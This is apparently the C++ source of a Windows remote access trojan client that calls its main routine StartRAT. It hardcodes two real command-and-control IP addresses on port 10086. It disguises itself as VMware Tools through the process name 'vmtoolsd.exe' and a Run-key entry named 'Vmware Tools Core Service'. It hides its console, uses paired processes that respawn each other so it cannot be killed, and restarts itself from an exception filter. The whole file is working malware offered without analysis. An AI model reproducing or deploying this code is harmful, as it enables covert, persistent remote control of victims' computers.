#include "Kernel.h"
#include "IOCPClient.h"
#include "Manager.h"
#include "utils.h"

#define VERSION L"2022.12.30.13.15"


#define ANTI_KILL_AUX_PROCESS TEXT("vmtoolsd.exe")
class AntiKill{
private:
	static void loop_check(TCHAR * MutexName){
		for (;;){
			Sleep(500);
			//printf("loop_check\n");

			HANDLE hMutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, MutexName);
			if (hMutex == NULL){
				//启动另一个进程.
				TCHAR FileName[MAX_PATH];
				STARTUPINFO si = { sizeof(si) };
				PROCESS_INFORMATION pi = { 0 };

				//如果是auxProcess不存在的话,拷贝一个,然后启动,...
				GetModuleFileName(GetModuleHandle(0), FileName, MAX_PATH);
				if (!lstrcmpi(MutexName, TEXT("AntiKill::auxProcess"VERSION))){
					TCHAR currentPath[MAX_PATH];
					GetProcessDirectory(currentPath);
					lstrcat(currentPath, TEXT("\\"ANTI_KILL_AUX_PROCESS));
					CopyFile(FileName, currentPath,FALSE);
					lstrcpy(FileName, currentPath);
				}
				
				CreateProcess(FileName, 0, 0, 0, 0, 0, 0, 0, &si, &pi);
				continue;
			}
			CloseHandle(hMutex);
		}
	}

	static bool IsAuxProcess(){
		TCHAR szName[] = TEXT("AntiKill::auxProcess"VERSION);
		HANDLE hMutex = CreateMutex(NULL, FALSE, szName);
		if (GetLastError() == ERROR_ALREADY_EXISTS){
			CloseHandle(hMutex);
			ExitProcess(0);
			return false;
		};
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)loop_check,
			(LPVOID)TEXT("AntiKill::Master"VERSION), 0, 0);
		return true;
	}

	static bool IsMasterProcess(){
		TCHAR szName[] = TEXT("AntiKill::Master"VERSION);
		HANDLE hMutex = CreateMutex(NULL, FALSE, szName);
		if (GetLastError() == ERROR_ALREADY_EXISTS){
			CloseHandle(hMutex);
			return false;
		};
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)loop_check,
			(LPVOID)TEXT("AntiKill::auxProcess"VERSION), 0, 0);

		return true;
	}
public:
	AntiKill(){
		if (!IsMasterProcess()){
			if (IsAuxProcess()){
				//printf("IsAuxProcess()\n");
				Sleep(INFINITE);
			}
		}
		Sleep(1000);
	}
};


class App{
public:
	static void StartRAT(){
#ifdef _DEBUG
		char szServerAddr[32] = "81.68.224.152";
#else
		char szServerAddr[32] = "49.235.129.40";
#endif
		
		USHORT Port = 10086;

		CManager *pManager = new CManager();
		CIOCPClient *pClient = new CIOCPClient(pManager,
			szServerAddr, Port, TRUE, INFINITE);

		CMsgHandler *pHandler = new CKernel(pManager);
		pManager->Associate(pClient, pHandler);
		pClient->Run();
	}

	static void Restart(){
		TCHAR szFileName[MAX_PATH];
		GetModuleFileName(GetModuleHandle(0), szFileName, MAX_PATH);

		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };

		if (FALSE ==
			CreateProcess(szFileName, 0, 0, 0, 0, 0, 0, 0, &si, &pi)){
			StartRAT();
			return;
		}
		ExitProcess(0);
	}


	static LONG WINAPI TOP_LEVEL_EXCEPTION_FILTER(
		_In_ struct _EXCEPTION_POINTERS *ExceptionInfo
		){
		ExceptionInfo->ContextRecord->Eip = (DWORD)Restart;
		return EXCEPTION_CONTINUE_EXECUTION;
	}

	static void AutoRun(){
		//注册表..
		HKEY hKey = NULL;
		TCHAR keyPath[] = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
		TCHAR exePath[MAX_PATH];
		GetModuleFileName(GetModuleHandle(0), exePath, MAX_PATH);
		//Open Key
		//HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
		if (ERROR_SUCCESS ==
			RegCreateKey(HKEY_CURRENT_USER, keyPath, &hKey)){
			DWORD dwError = RegSetValueEx(hKey, TEXT("Vmware Tools Core Service"), 0,
				REG_SZ, (BYTE*)exePath, sizeof(TCHAR)*(lstrlen(exePath) + 1));
			if (dwError){
				TCHAR szError[0x100];
				wsprintf(szError, TEXT("RegSetValueEx Failed With Error: %u"), dwError);
				MessageBox(0, szError, NULL, MB_OK);
			}
		}
	}

	static void Prepare(){
		ShowWindow(GetConsoleWindow(), SW_HIDE);
		SetUnhandledExceptionFilter(TOP_LEVEL_EXCEPTION_FILTER);

		//
		TCHAR szExplorer[] = TEXT("explorer.exe");
		DWORD PidOfExplorer = getProcessId(szExplorer);
		DWORD PidOfCurrentProcess = GetCurrentProcessId();
		DWORD dwParent = getParentProcessId(PidOfCurrentProcess);

		if (dwParent == PidOfExplorer){
			AutoRun();		// 必须父进程是explorer.exe,要不然会被杀掉...
		}
		return;
	}


	App(){
		CIOCPClient::SocketInit();
		Prepare();
		StartRAT();
	}
	~App(){
		CIOCPClient::SocketTerm();
	}
};


void Launch(){
	AntiKill antiKill;
	App theApp;
}

AntiKill antiKill;
int main(){
	CIOCPClient::SocketInit();
	App::StartRAT();
	return 0;
}